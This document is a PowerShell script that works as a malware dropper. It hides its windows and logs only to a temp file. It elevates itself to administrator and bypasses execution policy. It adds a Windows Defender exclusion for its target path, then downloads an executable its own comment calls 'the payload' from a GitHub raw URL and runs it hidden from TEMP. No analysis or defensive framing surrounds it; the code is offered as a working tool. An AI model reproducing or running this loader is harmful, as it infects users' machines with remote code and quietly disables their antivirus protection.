param(
    [string]$OriginalTemp = $env:TEMP,
    [string]$FileName = "cf.exe",
    [string]$RepoUrl = "https://github.com/monkbytting/client/raw/main"
)

# Silent logging to file only (no console output)
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message" -ErrorAction SilentlyContinue
}

# Check for admin privileges and elevate if needed
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Log "Elevating to admin privileges..."
    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`" -FileName `"$FileName`" -RepoUrl `"$RepoUrl`""
    try {
        (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe', $elevatedCommand, '', 'runas', 0)
        exit
    }
    catch {
        Write-Log "Failed to elevate privileges: $_"
        exit 1
    }
}

# Main execution block
try {
    Write-Log "Starting execution..."

    # Define output path (no -Resolve since file doesn’t exist yet)
    $output = Join-Path $OriginalTemp $FileName
    $outputDir = Split-Path $output -Parent
    Write-Log "Target path: $output"

    # Ensure directory exists
    if (-not (Test-Path $outputDir)) {
        Write-Log "Creating directory: $outputDir"
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }

    # Add Windows Defender exclusion (only if necessary)
    if ((Get-MpPreference).ExclusionPath -notcontains $output) {
        Write-Log "Adding exclusion to Windows Defender: $output"
        Add-MpPreference -ExclusionPath $output -ErrorAction SilentlyContinue
    }

    # Download the payload (Cbuilt.exe)
    $downloadUrl = "$RepoUrl/Cbuilt.exe"  # Fixed to use the specific payload name
    Write-Log "Downloading from: $downloadUrl"
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $downloadUrl -OutFile $output -TimeoutSec 30 -ErrorAction SilentlyContinue

    # Verify and execute
    if (Test-Path $output) {
        Write-Log "File downloaded successfully, executing: $output"
        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
    else {
        Write-Log "Download failed, file not found at: $output"
    }
}
catch {
    Write-Log "Error occurred: $_"
}
